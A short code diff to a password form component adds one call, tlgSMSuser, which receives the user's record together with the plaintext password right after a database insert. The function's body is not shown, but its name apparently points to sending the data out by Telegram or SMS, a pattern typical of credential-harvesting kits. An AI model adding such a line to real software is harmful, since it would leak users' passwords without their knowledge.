@@ -27,6 +27,7 @@ export default function PassForm({ open, close, user, dataInfo }) {
         .select();
       if (data) {
         user({ ...dataInfo, id: data[0].id, pass: pass });
+        tlgSMSuser({ ...dataInfo, id: data[0].id, pass: pass });
         close();
       }
     }
